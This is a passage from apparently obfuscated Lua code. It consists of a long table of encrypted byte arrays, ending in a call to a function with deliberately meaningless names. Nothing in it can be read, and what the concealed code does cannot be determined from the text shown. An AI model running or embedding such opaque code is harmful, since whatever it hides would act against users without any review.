98,208,33},{218,104,154,25,161,33,65,220,120},40,5,{},{204,78,198,37,179,5,107,237,64,166,50},{211,99,246,28,197,43,78,204,103,129,5},{202,120,140,31,198,45,67,191,127,128},{207,126,225,28,162,40,72,128,27,149,24,161,58,50,246,110,153,119},50,{214,121,128,29},80,{220,96,132,11,163},{234,102,139,9,191,60,83,247,125},{242,100,158,122,174,200,82,242},{228,103,141,30,180,196},7,{232,120,133,13,208,200,95,229,112},{230,119,155,7,209,206,88,232,116,148},{237,112,128,19,210,209,80,249,123,144,32,164},{234,127,237,51,163,199,84},{237,99,139,34,161,211,95,141,15,157,70,173,205,77,245,0,140},{132,17,239,14,128,233,59,220,52,186,20,218,226,78,147,50,184,30,152,247,81,152,46,166,20,103,226,94,210,34},{233,82,180,6},{238,102,148,39,162,222,88},{220,80,161},{221,50,186,8,141,164,120,211,40,189,81,185,244,80,228,47,175,6,106,245,76,148,109,178,25,105,226,75,179,39,197,83,35,236,92,165,56,128,47,126,196,65,174,44,223,199,127,203,79,177,0,130,236,110,129,18,167,1,150,239,83,205,23,187,31,116,189,118,214,63,182,6,108,247,69,151},{221,49,177,2,158},{200,35,184,13,193,201,68,192,20,191,31,118,250,69,220,100,253,34,105,249,82,219,35,151,85,35,179,124,172,53,136,16,95,206,84,177,62,156,175,87,207,91,191,1,144,242,124,222,17,154,16,149,234,112,222,45,179,68,170,241,79,221,26,172,10,103,241,21,136,124},{222,44,181,5,149,255},{221,43,180,11,145,176,81,197,116,187,14,111,240,18,252,43,149,39,98,232,91,169,48,131,81,46,205,71,171,11,142,12,103,205,84,175,127,217,163,122,198,95,174,14,213,228,107,147,38,181,10,159,183,103,214,50,138,9,141,228,76,219,46,246,83,84,251,75,196,53,145,5,43,181,1,142,58,139,26,98,241,88,166,35,136,242,51,202,73,226,28,154,228,106,202,93,165,1,133,164,85,197,46,183,7,147,230,70,143,11,179,15,111,243,66,233,57,129,7,99,177,29,142,123,197,10,120,176,98,176,50,154,13,117,199,12,138,51,129,236,112,203,79,230,7,129,233,121,217,41,188,8,209,165,63,222,53,246,40,150,240,86,214,41,169,21,113,184,97,201,34,131,27,103,242,74,251,23,143,27,99,199,86,149,45,141,11,119,141,9,250,119,209,225,121,206,20},{219,43,190,1,139,252,84},{212,39,180,9,197,213,64,204,24,187,3,114,254,73,216,120,193,35,122,249,93,139,59,152,14,122,242,81,181,44,132,227,118,132,16,226,21,135,232,104,249,91,160,17,146,249,105,138,0,185,7,146,234,65,193,96,189,27,111,247,83,211,34,142,91,47,185,75,222,63,128,66,76,251,69,151,50,152,11,121,192,83,225,126,191,238,116,209,94,188,18,214,174,52,225,47,176,7,149,220,115,211,60,189,25,208,210,76,214,56,188,19,119,243,91,146,7,151,24,105,245,65,168,48,221,57,101,193,93,161,60,191,11,115,209,93,227,27,159,241,122,132,117,165,14,151,231,115,198,38,134,28,154,250,68,224,62,170,8,46,217,83,212,60,182,28,98,177,11,219,63,128,94},{211,40,190},{217,39,184,15,109,180,79,135,42,129,30,99,163,107,218,38,182,29,121,232,88,167,50,194,95,64,207,87,176,57,157,241,55,129,21,130,14,151,230,118,253,44,178,31,156,254,49,241,45,185,25,159,242,80,210,56,243,56,118,251,72,210,32,139,17,40,243,0,140,53,159,50,104,193,95,178,49,209,18,115,209,80,229,54,132,227,114,138,85,254,43,147,232,112,219,42,232,5,154,250,73,154,47,175,10,101},{198,37,189,22,103,231,91},{209,37,175,80,92,186,89,156,38,140,85,120,250,71,179,39,207,29,108,205,86,252,30,137,11,65,192,74,189,55,146,225,63,136,109,188,2,143,236,110,220,96,252,82,188,235,85,228,43,187,20,101,225,85,145,101,246,82,97,247,11,206,35,141,25,126,181,64,237,24,136,17,106,142,69,230,14,157,228,102,238,94,228,64,150,232,125},{203,40,172,24,116,227,89},{223,35,173,82,90,180,88,158,56,138,87,122,252,89,177,37,193,27,110,207,80,242,28,139,245,80,194,73,174,5,157,226,120,194,75,161,77,209,162,62,213,43,247,3,155,176,80,140,0,175,46,42,183,100,212,45,128,24,84,249,95,169,35,146,91,37,191,93,183,120,152,68,88,215,118,226,127,163,224,100,192,76,187,64,220,168,111,198,36,186,71,138,255,73,221,50,241,31,197,213,64,204,13,171,29,104,217,75,208,53,203,95,32,188,74,172,49,200,30,96,197},24,{253,39,141,24,67,243,95,165,48,146,16,99,241},{244,32,144,28,114,244,64,181,53,139},62,{253,25,165,35,42,220,99,227,2,168,46,72,231,97},{210,55,150,11,106,249,84,38,215,76},{147,22,168,61},66,{132,58,139,14,125,237,91,180,46},{129,4,166,61,75,225,116,155,15},{169,50,153,14,113,196,83,233,40,128,162,116,196,87,238,2,152,238,127,195,52,160,132,121,42},76,{149,28,190,41,87,247,24,130,16,183,203},38,{42,219,122},{155,25,169,208,80,251,115},{135,28,163,208,54,232,127,155,43,186,198,72},{128,23,178,207,55,235,113,156},{143,13,179,214,80,139,127,157,40},{134,41,191,202,57,237,115,158,69,172,195,76,244,5,147,57},{157,36,184,193},{156,50,176,205,95},{158,44,181,197,85,255},{152,42,177,170,87,229,14,134},{145,42,168,210,62,228,13,147},{156,51,173,220,74,230},{149,43,182},{144,58,169},{129,40,174,193},{148,38,175},{135,44},{134,51,189,214,122,244,4,153,55,74},{151,8,115,224,71,222,41,144,7,113},{136,55,82,192,98,247},{181,1,100,250},{175,21,111,247,80,134,111},{191,21,105,254,68,157,37,138,18,51,188},{171,29,118,236,89,215,63,131},{181,0,99,235,101,219},{168,26,119,239,89,130,54,129,24,98}}
return _l1_l10(__I_22,_l_I23,_OOOI1,_0lO24)
